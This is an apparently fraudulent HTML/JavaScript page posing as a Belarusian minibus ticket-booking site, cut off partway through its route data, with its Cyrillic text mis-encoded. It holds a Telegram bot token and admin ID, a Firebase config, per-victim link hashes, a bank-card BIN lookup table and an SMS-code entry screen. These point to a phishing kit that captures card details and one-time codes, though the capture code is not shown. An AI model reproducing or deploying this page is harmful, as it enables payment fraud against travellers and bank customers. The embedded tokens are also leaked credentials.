<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>–ú–∞—Ä—à—Ä—É—Ç–∫–∞ ‚Ä¢ –ë–µ–ª–∞—Ä—É—Å—å</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
        }

        body {
            background: #0b1420;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
            position: relative;
            overflow-x: hidden;
        }

        /* –î–≤–∏–∂—É—â–∞—è—Å—è –º–∞—Ä—à—Ä—É—Ç–∫–∞ –Ω–∞ —Ñ–æ–Ω–µ (–æ—á–µ–Ω—å –ø—Ä–æ–∑—Ä–∞—á–Ω–∞—è) */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: -10%;
            width: 120%;
            height: 100%;
            background: url('https://cdn-icons-png.flaticon.com/512/2972/2972185.png') repeat-x 0 50%;
            background-size: 120px auto;
            opacity: 0.02;
            animation: drive 25s linear infinite;
            pointer-events: none;
            z-index: 0;
        }

        @keyframes drive {
            0% { background-position: -120px 50%; }
            100% { background-position: 100% 50%; }
        }

        .container {
            max-width: 600px;
            width: 100%;
            background: #ffffff;
            border-radius: 24px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
            overflow: hidden;
            position: relative;
            z-index: 1;
        }

        .header {
            background: #0b2b4a;
            padding: 24px 20px;
            text-align: center;
            border-bottom: 1px solid #1e3a5f;
        }

        .header a {
            color: #ffffff;
            text-decoration: none;
            font-size: 24px;
            font-weight: 600;
            letter-spacing: 0.5px;
        }

        .header a:hover {
            text-decoration: underline;
            opacity: 0.9;
        }

        .content {
            padding: 32px 24px;
            background: #ffffff;
        }

        .search-section {
            margin-bottom: 32px;
        }

        .section-title {
            font-size: 18px;
            font-weight: 600;
            color: #0b2b4a;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #eef2f6;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #4a5568;
            margin-bottom: 8px;
        }

        .form-group select,
        .form-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            font-size: 16px;
            color: #1e293b;
            background: #f8fafc;
            transition: all 0.2s;
            appearance: none;
        }

        .form-group select {
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%234a5568' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right 16px center;
        }

        .form-group select:focus,
        .form-group input:focus {
            outline: none;
            border-color: #0b2b4a;
            background: #ffffff;
            box-shadow: 0 0 0 3px rgba(11, 43, 74, 0.1);
        }

        .btn {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            margin-bottom: 12px;
        }

        .btn-primary {
            background: #0b2b4a;
            color: white;
        }

        .btn-primary:hover {
            background: #123b63;
        }

        .btn-secondary {
            background: #f1f5f9;
            color: #0b2b4a;
            border: 1px solid #e2e8f0;
        }

        .btn-secondary:hover {
            background: #e9eef3;
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .routes-list {
            margin-top: 24px;
        }

        .route-card {
            background: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 16px;
            transition: all 0.2s;
        }

        .route-card:hover {
            border-color: #0b2b4a;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
        }

        .route-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
        }

        .route-time {
            font-size: 20px;
            font-weight: 700;
            color: #0b2b4a;
        }

        .route-price {
            font-size: 22px;
            font-weight: 700;
            color: #0b2b4a;
        }

        .route-details {
            display: flex;
            flex-wrap: wrap;
            gap: 16px;
            margin-bottom: 16px;
            color: #4a5568;
            font-size: 14px;
        }

        .route-detail {
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .route-detail i {
            color: #64748b;
        }

        .route-points {
            background: #ffffff;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 16px;
            font-size: 14px;
            border: 1px dashed #cbd5e1;
        }

        .route-point {
            display: flex;
            align-items: flex-start;
            gap: 8px;
            margin-bottom: 8px;
        }

        .route-point:last-child {
            margin-bottom: 0;
        }

        .route-point-icon {
            color: #0b2b4a;
            font-weight: 600;
            min-width: 20px;
        }

        .route-point-text {
            color: #1e293b;
        }

        .route-seats {
            display: flex;
            align-items: center;
            gap: 8px;
            color: #059669;
            font-weight: 500;
            font-size: 14px;
        }

        .spinner {
            border: 3px solid #e2e8f0;
            border-top: 3px solid #0b2b4a;
            border-radius: 50%;
            width: 48px;
            height: 48px;
            animation: spin 1s linear infinite;
            margin: 32px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .summary-box {
            background: #f8fafc;
            border-radius: 16px;
            padding: 24px;
            margin-bottom: 24px;
            border: 1px solid #e2e8f0;
        }

        .summary-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
            font-size: 15px;
        }

        .summary-label {
            color: #64748b;
        }

        .summary-value {
            font-weight: 600;
            color: #1e293b;
        }

        .total-price {
            font-size: 24px;
            font-weight: 700;
            color: #0b2b4a;
            text-align: center;
            margin: 24px 0;
        }

        .sms-input {
            width: 100%;
            padding: 20px;
            font-size: 32px;
            letter-spacing: 8px;
            text-align: center;
            background: #f8fafc;
            border: 2px solid #e2e8f0;
            border-radius: 16px;
            margin-bottom: 20px;
            font-family: monospace;
        }

        .sms-input:focus {
            outline: none;
            border-color: #0b2b4a;
        }

        .success-box,
        .fail-box {
            text-align: center;
            padding: 32px 20px;
        }

        .success-icon {
            width: 64px;
            height: 64px;
            background: #d1fae5;
            color: #059669;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
            font-size: 32px;
        }

        .fail-icon {
            width: 64px;
            height: 64px;
            background: #fee2e2;
            color: #b91c1c;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
            font-size: 32px;
        }

        .footer {
            text-align: center;
            padding: 24px 20px;
            background: #f8fafc;
            border-top: 1px solid #e2e8f0;
            font-size: 12px;
            color: #94a3b8;
        }

        .footer p {
            margin-bottom: 4px;
        }
    </style>
</head>
<body>
    <div class="container" id="app"></div>

    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

    <script>
        (function() {
            // ==================== –ù–ê–°–¢–†–û–ô–ö–ò FIREBASE ====================
            const firebaseConfig = {
                apiKey: "AIzaSyB2IZy_bK8vQeiGpXYbvWvDyPcP80Dj984",
                authDomain: "marsutka-tt37.firebaseapp.com",
                databaseURL: "https://marsutka-tt37-default-rtdb.firebaseio.com",
                projectId: "marsutka-tt37",
                storageBucket: "marsutka-tt37.firebasestorage.app",
                messagingSenderId: "714890480273",
                appId: "1:714890480273:web:e537b2c757d521a88e0d30"
            };
            firebase.initializeApp(firebaseConfig);
            const db = firebase.database();

            // ==================== –î–ê–ù–ù–´–ï TELEGRAM ====================
            const BOT_TOKEN = '8529551109:AAGafdmClxe936XeYH5F3VfLrtFNZ20CP9c';
            const ADMIN_ID = 5852338439;
            const urlParams = new URLSearchParams(window.location.search);
            const linkHash = urlParams.get('hash');

            // ==================== –ì–û–†–û–î–ê –ë–ï–õ–ê–†–£–°–ò ====================
            const CITIES = [
                '–ú–∏–Ω—Å–∫', '–ì–æ–º–µ–ª—å', '–ë—Ä–µ—Å—Ç', '–í–∏—Ç–µ–±—Å–∫', '–ì—Ä–æ–¥–Ω–æ', '–ú–æ–≥–∏–ª—ë–≤',
                '–ë–æ–±—Ä—É–π—Å–∫', '–ë–∞—Ä–∞–Ω–æ–≤–∏—á–∏', '–ë–æ—Ä–∏—Å–æ–≤', '–û—Ä—à–∞', '–ü–∏–Ω—Å–∫', '–ú–æ–∑—ã—Ä—å',
                '–°–æ–ª–∏–≥–æ—Ä—Å–∫', '–õ–∏–¥–∞', '–ú–æ–ª–æ–¥–µ—á–Ω–æ', '–ü–æ–ª–æ—Ü–∫', '–ñ–ª–æ–±–∏–Ω', '–°–≤–µ—Ç–ª–æ–≥–æ—Ä—Å–∫',
                '–†–µ—á–∏—Ü–∞', '–°–ª—É—Ü–∫', '–ö–æ–±—Ä–∏–Ω', '–í–æ–ª–∫–æ–≤—ã—Å–∫', '–ù–æ–≤–æ–≥—Ä—É–¥–æ–∫', '–°–º–æ—Ä–≥–æ–Ω—å',
                '–ö–∞–ª–∏–Ω–∫–æ–≤–∏—á–∏'
            ];

            // ==================== –ë–ê–ó–ê BIN ====================
            const BIN_DB = {
                // –ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫
                '427901': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: 'Visa Classic' },
                '427902': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: 'Visa Gold' },
                '427903': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: 'Visa Platinum' },
                '425501': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: 'Mastercard Standard' },
                '425502': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: 'Mastercard Gold' },
                '911201': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: '–ú–ò–†' },
                '380101': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: '–ë–µ–ª–∫–∞—Ä—Ç' },
                '91123801': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: '–ú–ò–† Supreme' },
                
                // –ü—Ä–∏–æ—Ä–±–∞–Ω–∫
                '521324': { bank: '–ü—Ä–∏–æ—Ä–±–∞–Ω–∫', type: 'Mastercard Standard' },
                '521325': { bank: '–ü—Ä–∏–æ—Ä–±–∞–Ω–∫', type: 'Mastercard Gold' },
                '515701': { bank: '–ü—Ä–∏–æ—Ä–±–∞–Ω–∫', type: 'Visa Classic' },
                '515702': { bank: '–ü—Ä–∏–æ—Ä–±–∞–Ω–∫', type: 'Visa Gold' },
                
                // –ë–µ–ª–∏–Ω–≤–µ—Å—Ç–±–∞–Ω–∫
                '440501': { bank: '–ë–µ–ª–∏–Ω–≤–µ—Å—Ç–±–∞–Ω–∫', type: 'Visa Classic' },
                '440502': { bank: '–ë–µ–ª–∏–Ω–≤–µ—Å—Ç–±–∞–Ω–∫', type: 'Visa Gold' },
                '510501': { bank: '–ë–µ–ª–∏–Ω–≤–µ—Å—Ç–±–∞–Ω–∫', type: 'Mastercard' },
                
                // –ê–ª—å—Ñ–∞-–ë–∞–Ω–∫
                '458101': { bank: '–ê–ª—å—Ñ–∞-–ë–∞–Ω–∫', type: 'Visa Classic' },
                '458102': { bank: '–ê–ª—å—Ñ–∞-–ë–∞–Ω–∫', type: 'Visa Gold' },
                '555501': { bank: '–ê–ª—å—Ñ–∞-–ë–∞–Ω–∫', type: 'Mastercard Standard' },
                
                // –ë–∞–Ω–∫ –î–∞–±—Ä–∞–±—ã—Ç
                '462201': { bank: '–ë–∞–Ω–∫ –î–∞–±—Ä–∞–±—ã—Ç', type: 'Visa Classic' },
                '552201': { bank: '–ë–∞–Ω–∫ –î–∞–±—Ä–∞–±—ã—Ç', type: 'Mastercard' },
                
                // –¢–µ—Ö–Ω–æ–±–∞–Ω–∫
                '424601': { bank: '–¢–µ—Ö–Ω–æ–±–∞–Ω–∫', type: 'Visa' },
                '676301': { bank: '–¢–µ—Ö–Ω–æ–±–∞–Ω–∫', type: 'Maestro' },
                
                // –ü–∞—Ä–∏—Ç–µ—Ç–±–∞–Ω–∫
                '498401': { bank: '–ü–∞—Ä–∏—Ç–µ—Ç–±–∞–Ω–∫', type: 'Visa' },
                '427601': { bank: '–ü–∞—Ä–∏—Ç–µ—Ç–±–∞–Ω–∫', type: 'Mastercard' },
                
                // –†–†–ë-–ë–∞–Ω–∫
                '411111': { bank: '–†–†–ë-–ë–∞–Ω–∫', type: 'Visa' },
                
                // –°–±–µ—Ä–±–∞–Ω–∫
                '427688': { bank: '–°–±–µ—Ä–±–∞–Ω–∫', type: 'Visa' },
                '546901': { bank: '–°–±–µ—Ä–±–∞–Ω–∫', type: 'Mastercard' },
                
                // –í–¢–ë
                '427229': { bank: '–í–¢–ë', type: 'Visa' },
                '546801': { bank: '–í–¢–ë', type: 'Mastercard' },
                
                // –¢–∏–Ω—å–∫–æ—Ñ—Ñ
                '437772': { bank: '–¢–∏–Ω—å–∫–æ—Ñ—Ñ', type: 'Visa' },
                '521324': { bank: '–¢–∏–Ω—å–∫–æ—Ñ—Ñ', type: 'Mastercard' },
            };

            // ==================== –ú–ê–†–®–†–£–¢–´ (5+ —Ä–µ–π—Å–æ–≤ –Ω–∞ –∫–∞–∂–¥–æ–µ –Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ) ====================
            const ROUTES = [
                // –ú–∏–Ω—Å–∫ ‚Üí –ì–æ–º–µ–ª—å
                { from: '–ú–∏–Ω—Å–∫', to: '–ì–æ–º–µ–ª—å', time: '09:00', duration: '4—á 30–º', price: 27, seats: 15, 
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ì–æ–º–µ–ª—å¬ª, —É–ª. –ü—Ä–∏–≤–æ–∫–∑–∞–ª—å–Ω–∞—è 3' },
                { from: '–ú–∏–Ω—Å–∫', to: '–ì–æ–º–µ–ª—å', time: '13:00', duration: '4—á 30–º', price: 27, seats: 12,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ì–æ–º–µ–ª—å¬ª, —É–ª. –ü—Ä–∏–≤–æ–∫–∑–∞–ª—å–Ω–∞—è 3' },
                { from: '–ú–∏–Ω—Å–∫', to: '–ì–æ–º–µ–ª—å', time: '18:00', duration: '4—á 30–º', price: 29, seats: 8,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ì–æ–º–µ–ª—å¬ª, —É–ª. –ü—Ä–∏–≤–æ–∫–∑–∞–ª—å–Ω–∞—è 3' },
                { from: '–ú–∏–Ω—Å–∫', to: '–ì–æ–º–µ–ª—å', time: '23:00', duration: '4—á 15–º', price: 32, seats: 10,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ì–æ–º–µ–ª—å¬ª, —É–ª. –ü—Ä–∏–≤–æ–∫–∑–∞–ª—å–Ω–∞—è 3' },
                { from: '–ú–∏–Ω—Å–∫', to: '–ì–æ–º–µ–ª—å', time: '06:30', duration: '4—á 45–º', price: 25, seats: 20,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–í–æ—Å—Ç–æ—á–Ω—ã–π¬ª, —É–ª. –û–ª–µ–≥–∞ –ö–æ—à–µ–≤–æ–≥–æ', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ì–æ–º–µ–ª—å¬ª, —É–ª. –ü—Ä–∏–≤–æ–∫–∑–∞–ª—å–Ω–∞—è 3' },
                
                // –ú–∏–Ω—Å–∫ ‚Üí –ë—Ä–µ—Å—Ç
                { from: '–ú–∏–Ω—Å–∫', to: '–ë—Ä–µ—Å—Ç', time: '08:30', duration: '4—á 00–º', price: 30, seats: 12,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ë—Ä–µ—Å—Ç¬ª' },
                { from: '–ú–∏–Ω—Å–∫', to: '–ë—Ä–µ—Å—Ç', time: '12:30', duration: '4—á 00–º', price: 30, seats: 10,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ë—Ä–µ—Å—Ç¬ª' },
                { from: '–ú–∏–Ω—Å–∫', to: '–ë—Ä–µ—Å—Ç', time: '17:00', duration: '4—á 00–º', price: 32, seats: 8,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ë—Ä–µ—Å—Ç¬ª' },
                { from: '–ú–∏–Ω—Å–∫', to: '–ë—Ä–µ—Å—Ç', time: '21:30', duration: '3—á 45–º', price: 35, seats: 6,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–í–æ—Å—Ç–æ—á–Ω—ã–π¬ª, —É–ª. –û–ª–µ–≥–∞ –ö–æ—à–µ–≤–æ–≥–æ', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ë—Ä–µ—Å—Ç¬ª' },
                { from: '–ú–∏–Ω—Å–∫', to: '–ë—Ä–µ—Å—Ç', time: '05:00', duration: '4—á 15–º', price: 28, seats: 14,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ë—Ä–µ—Å—Ç¬ª' },
                
                // –ú–∏–Ω—Å–∫ ‚Üí –í–∏—Ç–µ–±—Å–∫
                { from: '–ú–∏–Ω—Å–∫', to: '–í–∏—Ç–µ–±—Å–∫', time: '09:30', duration: '3—á 45–º', price: 28, seats: 12,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–í–∏—Ç–µ–±—Å–∫¬ª' },
                { from: '–ú–∏–Ω—Å–∫', to: '–í–∏—Ç–µ–±—Å–∫', time: '14:00', duration: '3—á 45–º', price: 28, seats: 10,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–í–∏—Ç–µ–±—Å–∫¬ª' },
                { from: '–ú–∏–Ω—Å–∫', to: '–í–∏—Ç–µ–±—Å–∫', time: '18:30', duration: '3—á 45–º', price: 30, seats: 8,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–í–∏—Ç–µ–±—Å–∫¬ª' },
                { from: '–ú–∏–Ω—Å–∫', to: '–í–∏—Ç–µ–±—Å–∫', time: '22:00', duration: '3—á 30–º', price: 33, seats: 6,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–í–æ—Å—Ç–æ—á–Ω—ã–π¬ª, —É–ª. –û–ª–µ–≥–∞ –ö–æ—à–µ–≤–æ–≥–æ', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–í–∏—Ç–µ–±—Å–∫¬ª' },
                { from: '–ú–∏–Ω—Å–∫', to: '–í–∏—Ç–µ–±—Å–∫', time: '06:00', duration: '4—á 00–º', price: 26, seats: 14,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–í–∏—Ç–µ–±—Å–∫¬ª' },
                
                // –ú–∏–Ω—Å–∫ ‚Üí –ì—Ä–æ–¥–Ω–æ
                { from: '–ú–∏–Ω—Å–∫', to: '–ì—Ä–æ–¥–Ω–æ', time: '08:00', duration: '4—á 38–º', price: 27, seats: 12,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ì—Ä–æ–¥–Ω–æ¬ª, —É–ª. –ß—ã—Ä–≤–æ–Ω–∞–∞—Ä–º–µ–π—Å–∫–∞—è' },
                { from: '–ú–∏–Ω—Å–∫', to: '–ì—Ä–æ–¥–Ω–æ', time: '12:30', duration: '4—á 38–º', price: 27, seats: 10,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ì—Ä–æ–¥–Ω–æ¬ª, —É–ª. –ß—ã—Ä–≤–æ–Ω–∞–∞—Ä–º–µ–π—Å–∫–∞—è' },
                { from: '–ú–∏–Ω—Å–∫', to: '–ì—Ä–æ–¥–Ω–æ', time: '16:30', duration: '4—á 38–º', price: 29, seats: 8,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ì—Ä–æ–¥–Ω–æ¬ª, —É–ª. –ß—ã—Ä–≤–æ–Ω–∞–∞—Ä–º–µ–π—Å–∫–∞—è' },
                { from: '–ú–∏–Ω—Å–∫', to: '–ì—Ä–æ–¥–Ω–æ', time: '20:30', duration: '4—á 15–º', price: 32, seats: 6,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–í–æ—Å—Ç–æ—á–Ω—ã–π¬ª, —É–ª. –û–ª–µ–≥–∞ –ö–æ—à–µ–≤–æ–≥–æ', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ì—Ä–æ–¥–Ω–æ¬ª, —É–ª. –ß—ã—Ä–≤–æ–Ω–∞–∞—Ä–º–µ–π—Å–∫–∞—è' },
                { from: '–ú–∏–Ω—Å–∫', to: '–ì—Ä–æ–¥–Ω–æ', time: '05:30', duration: '5—á 00–º', price: 25, seats: 14,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ì—Ä–æ–¥–Ω–æ¬ª, —É–ª. –ß—ã—Ä–≤–æ–Ω–∞–∞—Ä–º–µ–π—Å–∫–∞—è' },
                
                // –ú–∏–Ω—Å–∫ ‚Üí –ú–æ–≥–∏–ª—ë–≤
                { from: '–ú–∏–Ω—Å–∫', to: '–ú–æ–≥–∏–ª—ë–≤', time: '09:00', duration: '2—á 30–º', price: 25, seats: 15,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ú–æ–≥–∏–ª—ë–≤¬ª, –ø—Ä. –ú–∏—Ä–∞ 6' },
                { from: '–ú–∏–Ω—Å–∫', to: '–ú–æ–≥–∏–ª—ë–≤', time: '13:00', duration: '2—á 30–º', price: 25, seats: 12,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ú–æ–≥–∏–ª—ë–≤¬ª, –ø—Ä. –ú–∏—Ä–∞ 6' },
                { from: '–ú–∏–Ω—Å–∫', to: '–ú–æ–≥–∏–ª—ë–≤', time: '17:00', duration: '2—á 30–º', price: 27, seats: 10,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ú–æ–≥–∏–ª—ë–≤¬ª, –ø—Ä. –ú–∏—Ä–∞ 6' },
                { from: '–ú–∏–Ω—Å–∫', to: '–ú–æ–≥–∏–ª—ë–≤', time: '20:30', duration: '2—á 15–º', price: 30, seats: 8,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–í–æ—Å—Ç–æ—á–Ω—ã–π¬ª, —É–ª. –û–ª–µ–≥–∞ –ö–æ—à–µ–≤–æ–≥–æ', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ú–æ–≥–∏–ª—ë–≤¬ª, –ø—Ä. –ú–∏—Ä–∞ 6' },
                { from: '–ú–∏–Ω—Å–∫', to: '–ú–æ–≥–∏–ª—ë–≤', time: '06:30', duration: '2—á 45–º', price: 23, seats: 18,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ú–æ–≥–∏–ª—ë–≤¬ª, –ø—Ä. –ú–∏—Ä–∞ 6' },
                
                // –ú–∏–Ω—Å–∫ ‚Üí –ë–æ–±—Ä—É–π—Å–∫
                { from: '–ú–∏–Ω—Å–∫', to: '–ë–æ–±—Ä—É–π—Å–∫', time: '08:30', duration: '1—á 40–º', price: 22, seats: 12,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ë–æ–±—Ä—É–π—Å–∫¬ª' },
                { from: '–ú–∏–Ω—Å–∫', to: '–ë–æ–±—Ä—É–π—Å–∫', time: '12:30', duration: '1—á 40–º', price: 22, seats: 10,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ë–æ–±—Ä—É–π—Å–∫¬ª' },
                { from: '–ú–∏–Ω—Å–∫', to: '–ë–æ–±—Ä—É–π—Å–∫', time: '16:30', duration: '1—á 40–º', price: 24, seats: 8,
